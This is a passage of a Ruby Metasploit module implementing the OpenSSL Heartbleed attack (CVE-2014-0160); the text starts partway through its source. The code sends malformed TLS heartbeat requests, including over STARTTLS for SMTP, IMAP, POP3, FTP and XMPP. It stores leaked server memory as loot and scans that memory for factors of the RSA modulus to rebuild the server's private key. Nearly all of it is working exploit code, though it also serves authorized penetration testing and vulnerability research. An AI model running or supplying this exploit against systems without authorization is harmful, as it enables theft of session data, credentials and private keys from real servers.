    'JABBER' => :tls_jabber,
    'POP3'   => :tls_pop3,
    'FTP'    => :tls_ftp
  }

  # See the discussion at https://github.com/rapid7/metasploit-framework/pull/3252
  SAFE_CHECK_MAX_RECORD_LENGTH = (1 << 14)

  def initialize
    super(
      'Name'           => 'OpenSSL Heartbeat (Heartbleed) Information Leak',
      'Description'    => %q{
        This module implements the OpenSSL Heartbleed attack. The problem
        exists in the handling of heartbeat requests, where a fake length can
        be used to leak memory data in the response. Services that support
        STARTTLS may also be vulnerable.

        The module supports several actions, allowing for scanning, dumping of
        memory contents, and private key recovery.
      },
      'Author'         => [
        'Neel Mehta', # Vulnerability discovery
        'Riku', # Vulnerability discovery
        'Antti', # Vulnerability discovery
        'Matti', # Vulnerability discovery
        'Jared Stafford <jspenguin[at]jspenguin.org>', # Original Proof of Concept. This module is based on it.
        'FiloSottile', # PoC site and tool
        'Christian Mehlmauer', # Msf module
        'wvu', # Msf module
        'juan vazquez', # Msf module
        'Sebastiano Di Paola', # Msf module
        'Tom Sellers', # Msf module
        'jjarmoc' #Msf module; keydump, refactoring..
      ],
      'References'     =>
        [
          ['CVE', '2014-0160'],
          ['US-CERT-VU', '720951'],
          ['URL', 'https://www.us-cert.gov/ncas/alerts/TA14-098A'],
          ['URL', 'http://heartbleed.com/'],
          ['URL', 'https://github.com/FiloSottile/Heartbleed'],
          ['URL', 'https://gist.github.com/takeshixx/10107280'],
          ['URL', 'http://filippo.io/Heartbleed/']
        ],
      'DisclosureDate' => 'Apr 7 2014',
      'License'        => MSF_LICENSE,
      'Actions'        =>
        [
          ['SCAN',  {'Description' => 'Check hosts for vulnerability'}],
          ['DUMP',  {'Description' => 'Dump memory contents'}],
          ['KEYS',  {'Description' => 'Recover private keys from memory'}]
        ],
      'DefaultAction' => 'SCAN'
    )

    register_options(
      [
        Opt::RPORT(443),
        OptEnum.new('TLS_CALLBACK', [true, 'Protocol to use, "None" to use raw TLS sockets', 'None', [ 'None', 'SMTP', 'IMAP', 'JABBER', 'POP3', 'FTP' ]]),
        OptEnum.new('TLS_VERSION', [true, 'TLS/SSL version to use', '1.0', ['SSLv3','1.0', '1.1', '1.2']]),
        OptInt.new('MAX_KEYTRIES', [true, 'Max tries to dump key', 10]),
        OptInt.new('STATUS_EVERY', [true, 'How many retries until status', 5]),
        OptRegexp.new('DUMPFILTER', [false, 'Pattern to filter leaked memory before storing', nil])
      ], self.class)

    register_advanced_options(
      [
        OptInt.new('HEARTBEAT_LENGTH', [true, 'Heartbeat length', 65535]),
        OptString.new('XMPPDOMAIN', [ true, 'The XMPP Domain to use when Jabber is selected', 'localhost' ])
      ], self.class)

  end

  def check_host(ip)
    @check_only = true
    vprint_status "#{peer} - Checking for Heartbleed exposure"
    if bleed
      Exploit::CheckCode::Appears
    else
      Exploit::CheckCode::Safe
    end
  end

  def run
    if heartbeat_length > 65535 || heartbeat_length < 0
      print_error("HEARTBEAT_LENGTH should be a natural number less than 65536")
      return
    end

    super
  end

  # If this is merely a check, set to the RFC-defined
  # maximum padding length of 2^14. See:
  # https://tools.ietf.org/html/rfc6520#section-4
  # https://github.com/rapid7/metasploit-framework/pull/3252
  def heartbeat_length
    if @check_only
      SAFE_CHECK_MAX_RECORD_LENGTH
    else
      datastore["HEARTBEAT_LENGTH"]
    end
  end

  def peer
    "#{rhost}:#{rport}"
  end

  def tls_smtp
    # https://tools.ietf.org/html/rfc3207
    sock.get_once
    sock.put("EHLO #{Rex::Text.rand_text_alpha(10)}\r\n")
    res = sock.get_once

    unless res && res =~ /STARTTLS/
      return nil
    end
    sock.put("STARTTLS\r\n")
    sock.get_once
  end

  def tls_imap
    # http://tools.ietf.org/html/rfc2595
    sock.get_once
    sock.put("a001 CAPABILITY\r\n")
    res = sock.get_once
    unless res && res =~ /STARTTLS/i
      return nil
    end
    sock.put("a002 STARTTLS\r\n")
    sock.get_once
  end

  def tls_pop3
    # http://tools.ietf.org/html/rfc2595
    sock.get_once
    sock.put("CAPA\r\n")
    res = sock.get_once
    if res.nil? || res =~ /^-/ || res !~ /STLS/
      return nil
    end
    sock.put("STLS\r\n")
    res = sock.get_once
    if res.nil? || res =~ /^-/
      return nil
    end
    res
  end

  def jabber_connect_msg(hostname)
    # http://xmpp.org/extensions/xep-0035.html
    msg = "<stream:stream xmlns='jabber:client' "
    msg << "xmlns:stream='http://etherx.jabber.org/streams' "
    msg << "version='1.0' "
    msg << "to='#{hostname}'>"
  end

  def tls_jabber
    sock.put(jabber_connect_msg(datastore['XMPPDOMAIN']))
    res = sock.get
    if res && res.include?('host-unknown')
      jabber_host = res.match(/ from='([\w.]*)' /)
      if jabber_host && jabber_host[1]
        disconnect
        connect
        vprint_status("#{peer} - Connecting with autodetected remote XMPP hostname: #{jabber_host[1]}...")
        sock.put(jabber_connect_msg(jabber_host[1]))
        res = sock.get
      end
    end
    if res.nil? || res.include?('stream:error') || res !~ /<starttls xmlns=['"]urn:ietf:params:xml:ns:xmpp-tls['"]/
      vprint_error("#{peer} - Jabber host unknown. Please try changing the XMPPDOMAIN option.") if res && res.include?('host-unknown')
      return nil
    end
    msg = "<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>"
    sock.put(msg)
    res = sock.get
    return nil if res.nil? || !res.include?('<proceed')
    res
  end

  def tls_ftp
    # http://tools.ietf.org/html/rfc4217
    res = sock.get
    return nil if res.nil?
    sock.put("AUTH TLS\r\n")
    res = sock.get_once
    return nil if res.nil?
    if res !~ /^234/
      # res contains the error message
      vprint_error("#{peer} - FTP error: #{res.strip}")
      return nil
    end
    res
  end

  def run_host(ip)
    case action.name
    when 'SCAN'
      loot_and_report(bleed)
    when 'DUMP'
      loot_and_report(bleed)  # Scan & Dump are similar, scan() records results
    when 'KEYS'
      getkeys()
    else
      #Shouldn't get here, since Action is Enum
      print_error("Unknown Action: #{action.name}")
      return
    end
  end

  def bleed()
    # This actually performs the heartbleed portion
    establish_connect
    vprint_status("#{peer} - Sending Heartbeat...")
    data, bleeding_threshold = heartbeat(heartbeat_length)
    sock.put(data)

    hdr = sock.get_once(5)
    if hdr.blank?
      vprint_error("#{peer} - No Heartbeat response...")
      return
    end

    unpacked = hdr.unpack('Cnn')
    type = unpacked[0]
    version = unpacked[1] # must match the type from client_hello
    len = unpacked[2]
print_status("XXXX len = #{len}")
    # try to get the TLS error
    if type == ALERT_RECORD_TYPE
      res = sock.get_once(len)
      alert_unp = res.unpack('CC')
      alert_level = alert_unp[0]
      alert_desc = alert_unp[1]
      msg = "Unknown error"
      # http://tools.ietf.org/html/rfc5246#section-7.2
      case alert_desc
      when 0x46
        msg = "Protocol error. Looks like the chosen protocol is not supported."
      end
      vprint_error("#{peer} - #{msg}")
      disconnect
      return
    end

    unless type == HEARTBEAT_RECORD_TYPE && version == TLS_VERSION[datastore['TLS_VERSION']]
      vprint_error("#{peer} - Unexpected Heartbeat response")
      disconnect
      return
    end

    # Read the magic length...no endless loop here as we have socket timeout
    # and this loop is useful when data come back in different chunks
    begin
      heartbeat_data = sock.get_once(heartbeat_length)
      while(heartbeat_data.length < heartbeat_length)
        heartbeat_data << sock.get_once(heartbeat_length - heartbeat_data.length)
      end
    rescue
      vprint_error("#{peer} - Looks like we got some problem while reading from socket...")
    end
    vprint_status("#{peer} - Heartbeat response, #{heartbeat_data.length} bytes")
    disconnect
    return heartbeat_data, bleeding_threshold
  end

  def loot_and_report(results)
    # In order to have a true positive we need to have data coming back and we
    # have to obtain more data than the data we sent in the malformed packet
    heartbeat_data = results[0]
    bleeding_threshold = results[1]
    if heartbeat_data
      if heartbeat_data.length > bleeding_threshold
        print_good("#{peer} - Heartbeat response with leak - Requested #{heartbeat_length} bytes, leaked #{heartbeat_data.length} bytes")
        report_vuln({
          :host => rhost,
          :port => rport,
          :name => self.name,
          :refs => self.references,
          :info => "Module #{self.fullname} successfully leaked info"
        })
        if datastore['MODE'] == 'DUMP' # Check mode, dump if requested.
          pattern = datastore['DUMPFILTER']
          if pattern
            match_data = heartbeat_data.scan(pattern).join
          else
            match_data = heartbeat_data
          end
            path = store_loot(
              "openssl.heartbleed.server",
              "application/octet-stream",
              rhost,
              match_data,
              nil,
              "OpenSSL Heartbleed server memory"
            )
            print_status("#{peer} - Heartbeat data stored in #{path} - \
              Requested #{heartbeat_length} bytes, leaked #{heartbeat_data.length} bytes")
        end
        vprint_status("#{peer} - Printable info leaked: #{heartbeat_data.gsub(/[^[:print:]]/, '')}")
      else
        vprint_error("#{peer} - Looks like there isn't leaked information although we got a response after sending a malformed packet...")
      end
    end
  end

  def getkeys()
    unless datastore['TLS_CALLBACK'] == 'None'
      print_error('TLS callbacks currently unsupported for keydumping action') #TODO
      return
    end

    print_status("#{peer} - Scanning for private keys")
    count = 0

    print_status("#{peer} - Getting public key constants...")
    n, e = get_ne

    if n.nil? || e.nil?
      print_error("#{peer} - Failed to get public key, aborting.")
    end

    vprint_status("#{peer} - n: #{n}")
    vprint_status("#{peer} - e: #{e}")
    print_status("#{peer} - #{Time.now.getutc} - Starting.")

    datastore['MAX_KEYTRIES'].times {
      # Loop up to MAX_KEYTRIES times, looking for keys
      if count % datastore['STATUS_EVERY'] == 0
        print_status("#{peer} - #{Time.now.getutc} - Attempt #{count}...")
      end

      p, q = get_factors(bleed, n) # Try to find factors in mem

      unless p.nil? || q.nil?
        key = key_from_pqe(p, q, e)
        print_good("#{peer} - #{Time.now.getutc} - Got the private key")

        print_status(key.export)
        path = store_loot(
          "openssl.heartbleed.server",
          "text/plain",
          rhost,
          key.export,
          nil,
          "OpenSSL Heartbleed Private Key"
        )
        print_status("#{peer} - Private key stored in #{path}")
        return
      end
      count += 1
    }
    print_error("#{peer} - Private key not found. You can try to increase MAX_KEYTRIES.")
  end

  def heartbeat(length)
    payload = "\x01"              # Heartbeat Message Type: Request (1)
    payload << [length].pack("n") # Payload Length: 65535

    # The payload length returned is useful to know if there was a leak!
    # It's the real lenght of the "malformed" heartbeat record sent, 
    # but if not coherent
    # with length specified as "payload length" passed as parameter, so
    # let's keep track of this value. So far it's value is 3 bytes!
    
    return ssl_record(HEARTBEAT_RECORD_TYPE, payload), payload.length
  end

  def client_hello
    # Use current day for TLS time
    time_temp = Time.now
    time_epoch = Time.mktime(time_temp.year, time_temp.month, time_temp.day, 0, 0).to_i

    hello_data = [TLS_VERSION[datastore['TLS_VERSION']]].pack("n") # Version TLS
    hello_data << [time_epoch].pack("N")    # Time in epoch format
    hello_data << Rex::Text.rand_text(28)   # Random
    hello_data << "\x00"                    # Session ID length
    hello_data << [CIPHER_SUITES.length * 2].pack("n") # Cipher Suites length (102)
    hello_data << CIPHER_SUITES.pack("n*")  # Cipher Suites
    hello_data << "\x01"                    # Compression methods length (1)
    hello_data << "\x00"                    # Compression methods: null

    hello_data_extensions = "\x00\x0f"      # Extension type (Heartbeat)
    hello_data_extensions << "\x00\x01"     # Extension length
    hello_data_extensions << "\x01"         # Extension data

    hello_data << [hello_data_extensions.length].pack("n")
    hello_data << hello_data_extensions

    data = "\x01\x00"                      # Handshake Type: Client Hello (1)
    data << [hello_data.length].pack("n")  # Length
    data << hello_data

    ssl_record(HANDSHAKE_RECORD_TYPE, data)
  end

  def ssl_record(type, data)
    record = [type, TLS_VERSION[datastore['TLS_VERSION']], data.length].pack('Cnn')
    record << data
  end

  def get_ne()
    # Fetch rhost's cert, return public key values
    connect(true, {"SSL" => true}) #Force SSL
    cert  = OpenSSL::X509::Certificate.new(sock.peer_cert)
    disconnect

    unless cert
      print_error("#{peer} - No certificate found")
      return
    end

    return cert.public_key.params["n"], cert.public_key.params["e"]
  end

  def get_factors(data, n)
    # Walk through data looking for factors of n
    psize = n.num_bits / 8 / 2
    return if data.nil?

    (0..(data.length-psize)).each{ |x|
      # Try each offset of suitable length
      can = OpenSSL::BN.new(data[x,psize].reverse.bytes.inject {|a,b| (a << 8) + b }.to_s)
      if can > 1 && can % 2 != 0 && can.num_bytes == psize
        # Only try candidates that have a chance...
        q, rem = n / can
        if rem == 0 && can != n
          vprint_good("#{peer} - Found factor at offset #{x.to_s(16)}")
          p = can
          return p, q
        end
      end
      }
    return nil, nil
  end

  def establish_connect
    connect

    unless datastore['TLS_CALLBACK'] == 'None'
      vprint_status("#{peer} - Trying to start SSL via #{datastore['TLS_CALLBACK']}")
      res = self.send(TLS_CALLBACKS[datastore['TLS_CALLBACK']])
      if res.nil?
        vprint_error("#{peer} - STARTTLS failed...")
        return
      end
    end

    vprint_status("#{peer} - Sending Client Hello...")
    sock.put(client_hello)

    server_hello = sock.get
    unless server_hello.unpack("C").first == HANDSHAKE_RECORD_TYPE
      vprint_error("#{peer} - Server Hello Not Found")
      return
    end
  end

  def key_from_pqe(p, q, e)
    # Returns an RSA Private Key from Factors
    key = OpenSSL::PKey::RSA.new()

    key.p = p
    key.q = q

    key.n = key.p*key.q
    key.e = e

    phi = (key.p - 1) * (key.q - 1 )
    key.d = key.e.mod_inverse(phi)

    key.dmp1 = key.d % (key.p - 1)
    key.dmq1 = key.d % (key.q - 1)
    key.iqmp = key.q.mod_inverse(key.p)

    return key
  end

end
